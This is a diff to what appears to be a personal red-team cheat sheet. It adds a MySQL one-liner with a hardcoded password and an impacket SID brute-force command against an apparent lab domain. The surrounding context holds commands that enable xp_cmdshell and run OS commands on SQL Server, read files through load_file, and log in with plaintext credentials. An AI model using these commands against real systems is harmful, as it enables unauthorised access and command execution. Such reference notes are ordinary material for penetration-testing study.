@@ -208,6 +208,9 @@ https://redteamtutorials.com/2018/10/24/nikto-cheatsheet/
 [sqsh:mssql connect]
 sqsh -S 172.16.1.5 -U sophie -P 'TerrorInflictPurpleDirt996655'
 
+[mysql connect and run commands in one liner]
+mysql -u drupaluser -p'CQHEy@9M*m23gBVj' -e 'show databases;'
+
 [mysql: read file]
 select load_file('/tmp/data.blob')
 
@@ -885,3 +888,6 @@ $ Get-SQLQuery -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;
 $ Get-SQLQuery -Query 'EXECUTE(''xp_cmdshell ''''whoami'''''') AT "DB-SQLSRV"'
 #### Execute OS command on sql server
 Invoke-SQLOSCmd -Instance fortress-db -Command "whoami"
+
+[bruteforce_sid]
+lookupsid.py vulnnet-rst.local/guest@10.10.130.156
